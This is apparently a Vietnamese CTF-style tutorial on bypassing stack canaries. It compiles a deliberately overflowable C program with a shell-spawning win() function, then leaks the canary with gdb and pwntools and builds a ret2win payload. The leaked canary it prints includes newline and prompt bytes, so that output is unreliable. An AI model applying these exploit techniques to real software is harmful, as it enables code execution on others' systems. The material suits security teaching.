# bypasscanary_chall_demo_file
## Bypass canary là gì?
* Thông thường, ở đầu 1 hàm, một giá trị ngẫu nhiên, gọi là canary, được tạo và được chèn vào cuối vùng rủi ro cao nơi stack có thể bị tràn. Ở cuối hàm, nó sẽ được kiểm tra xem giá trị canary này có bị sửa đổi không. Nếu có sẽ ngay lập tức exit chương trình.
* Vậy thì ta hiểu rằng nếu overwrite biến cục bộ với nhau trong buffer thì không vấn đề gì. Nhưng nếu overwrite làm thay đổi giá trị canary, thì khi kiểm tra ở cuối hàm, chương trình sẽ phát hiện và kết thúc ngay lập tức.
* Vậy thì làm sao để bypass canary?
–> Nếu tồn tại buffer overflow, thì cách duy nhất là leak canary.
Đương nhiên rồi, ta lấy ra giá trị canary đó, overwrite đến khi gặp canary thì ghi lại là xong.
## Tạo file chall
### **`bypasscanary.c`**
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Hàm win tạo shell
void win(void) {
    system("/bin/sh");
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main() {
    char name[32]; // Buffer dễ bị overflow
    char feedback[256]; // Buffer thứ hai để overflow return address
    long canary_value = 0;
    
    // Lấy giá trị canary từ fs register
    __asm__ volatile(
        "mov %%fs:0x28, %0;"
        : "=r"(canary_value)
    );
    
    // Đặt canary vào stack
    long canary_stack = canary_value;
    
    init();
    memset(name, 0, sizeof(name));
    memset(feedback, 0, sizeof(feedback));

    printf("Your name: ");
    read(0, name, 512); // Buffer overflow ở đây
    
    printf("Hello %s\n", name); // Leak canary qua output này
    
    printf("Your feedback: ");
    read(0, feedback, 512); // Buffer overflow thứ hai
    
    // Kiểm tra canary trước khi return
    if (canary_stack != canary_value) {
        printf("\n*** Stack Smashing Detected ***\n");
        exit(1);
    }
    
    puts("Thank you for your feedback!");
    return 0;
}
```
### Biên dịch chương trình
```bash
gcc -no-pie -fstack-protector -o chall6 bypasscanary.c
```
* Ta có file `chall6`
## Tiến hành khai thác
### Load file vào ida64
```bash
ida64 chall6
```
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[32]; // [rsp+10h] [rbp-130h] BYREF
  char buf[264]; // [rsp+30h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+138h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  ((void (__fastcall *)(int, const char **, const char **))init)(argc, argv, envp);
  memset(s, 0, sizeof(s));
  memset(buf, 0, 256uLL);
  printf("Your name: ");
  read(0, s, 512uLL);
  printf("Hello %s\n", s);
  printf("Your feedback: ");
  read(0, buf, 512uLL);
  puts("Thank you for your feedback!");
  return 0;
}
```
### Thử tại `name`
```
  ./chall6
Your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your feedback: Thank you for your feedback!
*** stack smashing detected ***: terminated
```
* Đã bị detect
### DEBUG bằng gdb
#### Đặt breakpoint sau ở lệnh `mov    rax, qword ptr fs:[0x28]` để thấy canary
```
RAX  0x1dd8d9a781437300
```
* Nhật xét: giá trị canary luôn có byte null ở đầu, sau đó là 7 bytes random nhưng không bao giờ là null.
#### Tìm offset tới canary
* Đặt breakpoint tại lệnh `read` đầu tiên, `tel` để tìm vị trí của canary:
```
27:0138│-008 0x7fffffffe188 ◂— 0x3e767fc7b38d2500
28:0140│ rbp 0x7fffffffe190 ◂— 1
```
* Có thể thấy giá trị canary nằm ở `rsp+0x138`
* `run` chương trình và nhập vào input gồm 512 bytes
```
27:0138│-008 0x7fffffffe188 ◂— 0x626161616161616d ('maaaaaab')
28:0140│ rbp 0x7fffffffe190 ◂— 0x626161616161616e ('naaaaaab')
```
* Có thể thấy canary đã bị ta overwrite
```bash
cyclic -l 0x626161616161616d
```
```
Finding cyclic pattern of 8 bytes: b'maaaaaab' (hex: 0x6d61616161616162)
Found at offset 296
```
### Ý tưởng
* Ta thấy offset từ buffer tới canary là 296 nha.
* Ở đây chương trình còn sử dụng hàm `read()`, không có cơ chế tự thêm byte null, lợi dụng điều đó ta overwrite 296 bytes thì vừa tới canary, vậy ghi thêm 1 bytes nữa thì sẽ vào bytes đầu của canary thì `printf()` sẽ leak ra cho mình canary.
* Ngoài ra chương trình có hàm win, vậy thì ret2win là xong.
### SCRIPT
* Đầu tiên ta overwrite 297 bytes:
```python
p.sendafter(b'Your name: ',b'A'*(296 + 1))
p.recvuntil(b'A'*(296 + 1))
canary = u64(b'\0' + p.recv(7))
print("Canary leak: ",hex(canary))
```
* Thử xem đã in được canary hay chưa
```
  python3 solve6.py DEBUG
[+] Starting local process './chall6' argv=[b'./chall6'] : pid 700789
[DEBUG] Received 0xb bytes:
    b'Your name: '
[DEBUG] Sent 0x129 bytes:
    b'A' * 0x129
[DEBUG] Received 0x142 bytes:
    00000000  48 65 6c 6c  6f 20 41 41  41 41 41 41  41 41 41 41  │Hell│o AA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000120  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 36  │AAAA│AAAA│AAAA│AAA6│
    00000130  e7 6d 0a 59  6f 75 72 20  66 65 65 64  62 61 63 6b  │·m·Y│our │feed│back│
    00000140  3a 20                                               │: │
    00000142
Canary leak:  0x756f590a6de73600
```
* Xây dựng payload tiếp tục overwrite biến `feedback`
```python
payload  = b'A'*(0x128 - 0x20)
payload += p64(canary)
payload += p64(0) # fake rbp
payload += p64(exe.sym['win']+8)
p.sendafter(b'Your feedback: ', payload)

```




